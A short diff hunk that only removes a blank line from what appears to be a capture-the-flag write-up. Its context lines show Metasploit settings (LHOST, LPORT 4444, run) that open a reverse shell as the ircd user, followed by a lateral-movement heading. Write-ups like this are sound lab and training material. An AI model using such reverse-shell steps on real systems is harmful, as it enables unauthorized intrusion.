@@ -32,7 +32,6 @@ set LHOST <tun0 IP>
 set LPORT 4444
 run
 ```
-
 Shell as `ircd`
 
 ## Lateral Movement 
